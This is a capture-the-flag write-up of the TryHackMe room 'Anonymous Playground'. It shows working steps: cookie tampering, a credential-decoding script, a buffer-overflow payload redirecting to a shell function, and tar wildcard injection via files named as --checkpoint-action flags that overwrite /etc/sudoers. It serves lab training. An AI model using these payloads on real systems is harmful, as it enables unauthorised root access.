# Anonymous Playground — TryHackMe Writeup

**Difficulty:** Hard
**Estimated Time:** 120 minutes

## Description

> Want to become part of Anonymous? They have a challenge for you. Can you get the flags and become an operative?

---

## Table of Contents

- [Recon](#recon)
- [Finding Hidden Credentials](#finding-hidden-credentials)
- [Initial Access via SSH](#initial-access-via-ssh)
- [Exploiting the SUID Binary](#exploiting-the-suid-binary)
- [Privilege Escalation to Root](#privilege-escalation-to-root)
- [Conclusion](#conclusion)

---

## Recon

Starting with an `nmap` scan to enumerate open ports and services:

![](Nmap.png)

Two ports are open:

- **22** — SSH
- **80** — HTTP

While reviewing the `nmap` output, a `robots.txt` entry stood out, pointing to an unusual endpoint. I made a note of it and moved on to check the web app itself first.

![](HomePage.png)

The site has three links: **Home**, **Operatives**, and **Contact**. Nothing immediately useful there, so I went back to the endpoint disclosed in `robots.txt`.

![](Strange%20Endpoint.png)

Visiting it returned an access-denied style message. Inspecting the page's cookies revealed a value that could be modified to unlock access.

![](Granted.png)

After adjusting the cookie, the page revealed an encoded string:

```
hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN
```

## Finding Hidden Credentials

The string clearly wasn't plaintext, so it needed decoding. After some trial and error, I found a hint buried elsewhere on the site:

```
'zA' = 'a'
```

Breaking that down: `z` is the 26th letter of the alphabet, `A` is the 1st. `26 + 1 = 27`, and `27 mod 26 = 1`, which maps back to `a`. In other words, each decoded character is produced by summing two encoded characters (reduced via `& 31` to get their alphabet position) and taking the result modulo 26.

With that logic confirmed, I wrote a small script to decode both the username and password:

```python
def position(s):
    values = [ord(c) & 31 for c in s]
    pairs = [values[i] + values[i + 1] for i in range(0, len(values), 2)]
    return ''.join(chr((n % 26) + 96) for n in pairs)

username = position('hEzAdCfHzA')
password = position('hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN')

print(f"{username} :: {password}")
```

![](username&password.png)

This decoded cleanly into a valid username and password pair.

## Initial Access via SSH

With working credentials in hand, I logged in over SSH:

![](InitialAccess.png)

This gave access to the first flag:

![](FirstFlag.png)

## Exploiting the SUID Binary

Inside the home directory sat a SUID binary clearly meant to be reverse engineered and exploited.

![](TestingBinary.png)

Fuzzing it with a long string of `A`s produced a segmentation fault, confirming an unbounded write — consistent with the binary's use of `gets()`. Further testing pinned the overflow offset to the saved return address at **72 bytes**.

Loading the binary into `gdb`, two functions stood out: `main` and `call_bash`. Disassembling both showed that `call_bash` drops privileges to a fixed UID via `setuid()` and then calls `system()` — in other words, a built-in backdoor function the challenge wants you to jump to.

![](1gdb.png)
![](disasFunctions.png)

To confirm the crash point and the exact state of the stack at the moment of the overflow, I set two breakpoints — one at `gets@plt` and one immediately after it — and stepped through execution:

![](2gdb.png)

With the offset (72 bytes) and the address of `call_bash` confirmed, I built a payload that overflows the buffer, overwrites the saved return address, and redirects execution straight into `call_bash` instead of back into `main`:

```bash
(python -c 'print "A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00"'; cat) | ./hacktheworld
```

The trailing `cat` keeps stdin open after the payload is delivered, so the shell spawned by `call_bash` stays interactive instead of dying immediately on EOF.

![](BufferOverFlow.png)

This landed a shell as the `spooky` user.

## Privilege Escalation to Root

With a foothold as `spooky`, I started looking for a path to root. Two things caught my attention: the system-wide `/etc/crontab`, and a script called `.webscript` sitting in `/home/spooky`.

```bash
cat /etc/crontab
```

```
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/1 *   * * *	root	cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
```

The key line is the last one: **every minute, root runs `tar` against every file in `/home/spooky`, using a bare wildcard (`*`)**. That wildcard is the vulnerability. When the shell expands `*`, any filename that happens to look like a `tar` flag gets passed to `tar` as an actual command-line argument instead of a file to archive — this is the well-known `tar` wildcard injection technique.

Specifically, `tar` supports a `--checkpoint-action` flag that can execute an arbitrary command during the archiving process. By dropping two carefully named files into the directory, I could get `tar` itself (running as `root`, triggered by cron) to execute a script of my choosing:

```bash
echo 'echo "spooky ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > hell.sh

echo "" > "--checkpoint-action=exec=sh hell.sh"

echo "" > --checkpoint=1
```

When cron's `tar` command runs next, the wildcard expansion effectively turns into:

```bash
tar -zcf /var/backups/spooky.tgz --checkpoint-action=exec=sh hell.sh --checkpoint=1 flag.txt ...
```

`tar` interprets `--checkpoint-action=exec=sh hell.sh` as an instruction to run `hell.sh` via `sh` as part of its checkpointing behavior — and since the cron job runs as `root`, `hell.sh` executes with root privileges. The script simply grants `spooky` full passwordless `sudo` access.

After waiting for the next cron tick (up to 60 seconds), I confirmed the change took effect and escalated:

```bash
sudo bash
```

![](Root.png)

From there, reading the final root-owned flag was trivial.

## Conclusion

This room chained several distinct skills together:

1. **Web enumeration** — finding a hidden endpoint via `robots.txt` and bypassing an access check through cookie manipulation.
2. **Custom cipher analysis** — reverse engineering a simple positional/modular encoding scheme from a single hint.
3. **Binary exploitation** — identifying a `gets()`-based buffer overflow, calculating the offset to the saved return address, and redirecting execution to a hidden privileged function inside the binary.
4. **Linux privilege escalation** — abusing an unsafe wildcard in a root cron job's `tar` command to achieve arbitrary code execution as root.

A solid end-to-end exercise covering web, crypto, pwn, and privesc in a single box.
